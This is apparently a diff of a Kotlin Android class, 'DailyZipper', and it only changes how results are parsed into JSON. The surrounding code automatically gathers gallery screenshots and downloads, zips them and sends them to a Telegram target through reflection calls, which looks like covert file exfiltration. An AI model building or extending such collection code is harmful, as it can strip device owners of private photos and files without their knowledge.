@@ -266,7 +266,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - باستخدام toString() ثم JSONObject
+    //  إرسال الملفات إلى Telegram - باستخدام JSONObject فقط
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,15 +301,18 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // تحويل النتيجة إلى JSONObject باستخدام toString()
-                val json = try {
-                    if (result is JSONObject) result
-                    else {
-                        val str = result?.toString() ?: "{}"
-                        JSONObject(str)
+                // تحويل النتيجة إلى JSONObject بأمان
+                val json = when (result) {
+                    is JSONObject -> result
+                    is Map<*, *> -> {
+                        try {
+                            @Suppress("UNCHECKED_CAST")
+                            JSONObject(result as Map<String, Any?>)
+                        } catch (e: Exception) {
+                            null
+                        }
                     }
-                } catch (e: Exception) {
-                    null
+                    else -> null
                 }
 
                 val success = json?.optBoolean("ok", false) ?: false
@@ -619,7 +622,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - باستخدام toString() ثم JSONObject
+    //  التشغيل التلقائي - باستخدام JSONObject فقط
     // ============================================================
 
     fun run(): Boolean {
@@ -640,15 +643,18 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // تحويل العنصر إلى JSONObject باستخدام toString()
-                            val json = try {
-                                if (item is JSONObject) item
-                                else {
-                                    val str = item?.toString() ?: "{}"
-                                    JSONObject(str)
+                            // تحويل العنصر إلى JSONObject بأمان
+                            val json = when (item) {
+                                is JSONObject -> item
+                                is Map<*, *> -> {
+                                    try {
+                                        @Suppress("UNCHECKED_CAST")
+                                        JSONObject(item as Map<String, Any?>)
+                                    } catch (e: Exception) {
+                                        null
+                                    }
                                 }
-                            } catch (e: Exception) {
-                                null
+                                else -> null
                             }
                             val path = json?.optString("path", "") ?: ""
                             if (path.isNotEmpty()) {
